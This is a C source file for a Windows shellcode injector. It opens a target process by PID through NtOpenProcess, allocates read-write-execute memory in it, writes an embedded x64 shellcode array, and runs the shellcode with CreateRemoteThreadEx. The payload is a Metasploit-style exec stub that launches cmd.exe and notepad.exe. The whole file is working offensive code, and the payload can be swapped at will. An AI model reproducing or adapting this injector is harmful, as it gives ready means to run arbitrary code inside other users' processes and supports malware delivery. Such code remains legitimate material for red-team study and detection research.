/* INCLUDES */
#include "nt_process.h"

/* GET MODULE HANDLE */
HMODULE GetMod(IN LPCWSTR modName) {
	HMODULE hModule = NULL;
	// trying to get handle
	info("trying to get a handle to %S", modName);
	hModule = GetModuleHandleW(modName);
	// failed to get handle
	if (hModule == NULL) {
		warn("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
		return NULL;
	}
	// got handle
	okay("got a handle to the module!");
	info("\\___[ %ls\n\t\\_0x%p]\n", modName, hModule);
	return hModule;
}

/* MAIN */
int main(int argc, char* argv[]) {
	/* INIT/DECLARE */
	DWORD dwTID;
	DWORD PID = 0;
	LPVOID rBuffer = NULL;
	NTSTATUS STATUS = 3;
	HMODULE hNTDLL = NULL;
	HANDLE hThread = NULL;
	HANDLE hProcess = NULL;

	/* SHELLCODE */
	CONST UCHAR shellPuke[] = {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
	0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,
	0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
	0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,
	0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
	0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
	0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,
	0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
	0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
	0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
	0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
	0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
	0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
	0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
	0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
	0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
	0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
	0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,
	0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,
	0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,
	0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,
	0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x6d,0x64,
	0x2e,0x65,0x78,0x65,0x20,0x2f,0x63,0x20,0x74,0x79,0x70,0x65,
	0x20,0x67,0x61,0x74,0x6f,0x2e,0x74,0x78,0x74,0x20,0x6e,0x6f,
	0x74,0x65,0x70,0x61,0x64,0x2e,0x65,0x78,0x65,0x00};

	// shellcode size
	SIZE_T szPuke = sizeof(shellPuke);

	/* CHECK ARGS */
	if (argc < 2) {
		warn("usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}
	
	// grab module handle && target proccess ID
	PID = atoi(argv[1]);
	hNTDLL = GetMod(L"NTDLL");

	// init OA && CID
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID = { (HANDLE)PID, NULL };

	// info begin dll function addresses
	info("populating function prototypes...");

	/* INIT NtOpenProcess */
	NtOpenProcess openProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	if(openProcess == NULL) {
		warn("[NtOpenProcess] failed to get NTDLL function address for NtOpenProcess");
		return EXIT_FAILURE;
	}

	/* INIT NtClose */
	NtClose close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
	if(close == NULL) {
		warn("[NtClose] failed to get NTDLL function address for NtClose");
		return EXIT_FAILURE;
	}

	// got dll function addresses
	okay("finished, beginning injection!");

	/* GET PROCESS HANDLE */
	STATUS = openProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS) {
		warn("[NtOpenProcess] failed to get a handle on the process, error: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	okay("got a handle on the process! (%ld)", PID);
	info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

	/* ALLOCATE VIRTUAL MEMORY */
	info("allocating [RWX] buffer in process memory...");
	rBuffer = VirtualAllocEx(hProcess, NULL, szPuke, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rBuffer == NULL) {
		warn("[VirtualAllocEx] failed, error: 0x%lx", GetLastError());
		goto CLEANUP;
	}
	okay("allocated [RWX] buffer in process memory at 0x%p", rBuffer);

	/* WRITE TO MEMORY */
	info("writing to allocated buffer...");
	WriteProcessMemory(hProcess, rBuffer, shellPuke, szPuke, 0);

	/* CREATE && EXECUTE THREAD */
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
	if (hThread == NULL) {
		warn("[CreateRemoteThreadEx] failed to get a handle on the thread, error %ld", GetLastError());
		goto CLEANUP;
	}
	okay("thread created, started routine! waiting fo thread to finish execution...");

	/* WAIT FOR THREAD COMPLETION */
	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished execution! beginning cleanup...");

/* CLEANUP */
CLEANUP:

	/* CLOSE HANDLES */
	if (hThread) {
		close(hThread);
		info("closed handle on thread");
	}
	if (hProcess) {
		close(hProcess);
		info("closed handle on process");
	}

	/* EXIT */
	okay("finished with cleanup, thanks ;)");
	return EXIT_SUCCESS;
}